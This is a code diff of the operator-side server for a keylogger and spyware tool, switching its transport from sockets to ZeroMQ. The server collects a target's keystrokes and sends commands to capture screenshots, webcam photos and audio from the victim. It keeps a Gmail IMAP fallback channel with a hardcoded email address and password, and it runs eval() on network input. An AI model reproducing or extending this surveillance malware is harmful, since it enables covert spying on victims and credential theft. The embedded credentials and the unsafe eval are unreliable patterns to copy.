@@ -1,4 +1,4 @@
-import socket
+import zmq
 import threading, os, getpass, shutil, sys, platform
 from datetime import datetime
 from utils import write_file
@@ -25,36 +25,40 @@ logging.config.fileConfig('logging.conf')
 logger = logging.getLogger('action')
 
 
-class Server:
-	def __init__(self, ip_address, port):
+class Communication:
+	def __init__(self, ip_address, port_stream, port_interact):
 		self.ip_address = ip_address
-		self.port = port
-		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.port_stream = port_stream
+		self.port_interact = port_interact
 
 
-	def connect(self):
-		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-		self.server.bind((self.ip_address, self.port))
-		self.server.listen(1)
+	def connect2stream(self):
+		self.stream_context = zmq.Context()
+		self.socket_stream = self.stream_context.socket(zmq.SUB)
+		self.socket_stream.bind('tcp://' + self.ip_address + ':' + str(self.port_stream))
+		self.socket_stream.subscribe('')
 
-		try:
-			self.client, self.client_addr = self.server.accept()
-			self.client.setblocking(True)
-		except socket.error:
-			raise socket.error
+		if self.socket_stream.recv_string() != 'OK':
+			raise Exception('Connection failed!')
 
 
-class KeyLogger(threading.Thread):
+	def connect2interaction(self):
+		self.interact_context = zmq.Context()
+		self.socket_interact = self.interact_context.socket(zmq.REQ)
+		self.socket_interact.bind('tcp://' + self.ip_address + ':' + str(self.port_interact))
+
+
+class KeyLogger(threading.Thread):	#zeromq
 	def __init__(self, connection, gui, email_address, email_password):
 		super(KeyLogger, self).__init__()
 
 		self.email_address = email_address
 		self.email_password = email_password
 		self.imap_alias = 'imap.gmail.com'
-		if isinstance(connection, Server):
+		if isinstance(connection, Communication):
 			self.connection = connection
 		else:
-			raise TypeError("\'connection\' parameter should be \'Server\' type!")
+			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
 		if isinstance(gui, GUIWindow):
 			self.gui = gui
 		else:
@@ -83,7 +87,7 @@ class KeyLogger(threading.Thread):
 	def run(self):
 		global stop_threads
 
-		system_info = self.connection.client.recv(4096).decode()
+		system_info = self.connection.socket_stream.recv_string()
 		system_info = eval(system_info)
 
 		path = '../logs/'
@@ -106,51 +110,29 @@ class KeyLogger(threading.Thread):
 
 		filename = 'log.csv'
 
-		max_buff_length = 41_960_000
 		while True:
 			try:
 				# data = [type, time, information]
 				# type = <string> image, char, wcpic(webcam picture)
 				# time = <string> current time when the key was pressed
 				# information = <string> character pressed by the target
-				data = self.connection.client.recv(max_buff_length).decode()
-
+				data = self.connection.socket_stream.recv_string()
 				data = eval(data)
 
 				# data process
-				if data[0] == "image":
-					if data[2] == 'Error':
-						logger.info("Error with taking screenshot!")
-					else:
-						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
-							handler.write(data[2])
-						logger.info('Done')
-				elif data[0] == "chars":
+				if data[0] == "chars":
 					write_file(os.path.join(path, filename), data[1:])
 					if gui_running:
 						self.gui.insert_data(data[1:])
-				elif data[0] == "wcpic":
-					if data[2] == 'Error':
-						logger.info("Error with taking webcam picture!")
-					else:
-						with open(f'./webcam_{data[1]}.png', 'wb') as handler:
-							handler.write(data[2])
-						logger.info('Done')
-				elif data[0] == 'audio':
-					if data[2] == 'Error':
-						logger.info("Error with recording audio!")
-					else:
-						with open(f'./audio_{data[1]}.wav', 'wb') as handler:
-							handler.write(data[2])
-						logger.info('Done')
 				elif data[0] == 'close':
-					self.connection.client.close()
+					self.connection.socket_stream.close()
 					logger.info("Connection closed!\n")
 					break
 
 			except:
 				stop_threads = True
-				self.connection.client.close()
+				self.connection.socket_stream.close()
+				self.connection.socket_interact.close()
 				logger.info("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
 				break
 
@@ -192,17 +174,17 @@ class KeyLogger(threading.Thread):
 								shutil.move(os.path.join(temp_path, "screenshot.png"), f"./screenshot_{date_time}.png")
 								logger.info('Done\n')
 			except:
-				logger.info("Something went wrong with email processing!")
+				logger.info("Something went wrong while processing email!")
 				break
 
 
 class MenuHandler(threading.Thread):
 	def __init__(self, connection):
 		super(MenuHandler, self).__init__()
-		if isinstance(connection, Server):
+		if isinstance(connection, Communication):
 			self.connection = connection
 		else:
-			raise TypeError("\'connection\' parameter should be \'Server\' type!")
+			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
 
 
 	def run(self):
@@ -212,44 +194,76 @@ class MenuHandler(threading.Thread):
 
 		while True:
 			option = str(input(">>> "))
+
+			# requests
 			if option.lower() == 'help':
 				print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")
 			elif option == '1':
 				logger.info('Taking screenshot...')
 				try:
-					self.connection.client.sendall(option.encode())
+					self.connection.socket_interact.send_string(option)
 				except:
 					break
 			elif option == '2':
 				logger.info('Taking webcam picture...')
 				try:
-					self.connection.client.sendall(option.encode())
+					self.connection.socket_interact.send_string(option)
 				except:
 					break
 			elif option == '3':
 				logger.info('Recording audio...')
 				try:
-					self.connection.client.sendall(option.encode())
+					self.connection.socket_interact.send_string(option)
 				except:
 					break
 			elif option == '4' or stop_threads:
 				stop_threads = True
 				logger.info("Closing the connection...")
-				self.connection.client.sendall(option.encode())
+				self.connection.socket_interact.send_string(option)
 				break
 			elif option == '':
 				pass
 			else:
 				print("Wrong option!\n")
 
+			# resposes
+			if option in ['1', '2', '3']:
+				data = self.connection.socket_interact.recv_string()
+				data = eval(data)
+
+				if data[0] == "image":
+					if data[2] == 'Error':
+						logger.info("Error while taking screenshot!")
+					else:
+						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
+							handler.write(data[2])
+						logger.info('Done')
+					prompt = True
+				elif data[0] == "wcpic":
+					if data[2] == 'Error':
+						logger.info("Error while taking webcam picture!")
+					else:
+						with open(f'./webcam_{data[1]}.png', 'wb') as handler:
+							handler.write(data[2])
+						logger.info('Done')
+					prompt = True
+				elif data[0] == 'audio':
+					if data[2] == 'Error':
+						logger.info("Error while recording audio!")
+					else:
+						with open(f'./audio_{data[1]}.wav', 'wb') as handler:
+							handler.write(data[2])
+						logger.info('Done')
+
 
 def main():
 	global gui_running, stop_threads
 
-	server = Server(ip_address='', port=10001)
+	communication = Communication(ip_address='*', port_stream=10001, port_interact=10002)
 	try:
-		logger.info('Waitiog for connection...')
-		server.connect()
+		logger.info('Waiting for connection...')
+		communication.connect2stream()
+		communication.connect2interaction()
 	except socket.error:
 		print(socket.error)
 		sys.exit(1)
@@ -258,17 +272,23 @@ def main():
 	gui = GUIWindow("KeyStrokeLogger")
 
 	try:
-		key_logger = KeyLogger(connection=server, gui=gui, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
+		key_logger = KeyLogger(connection=communication, gui=gui, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
 		key_logger.start()
 
-		menu = MenuHandler(connection=server)
+		menu = MenuHandler(connection=communication)
 		menu.start()
 	except TypeError as err:
 		print(err)
 		sys.exit(1)
+	except Exception as err:
+		logger.debug(err)
+		sys.exit(1)
 
 	gui_running = True
-	gui.run()
+	try:
+		gui.run()
+	except:
+		pass
 	gui_running = False
 
 
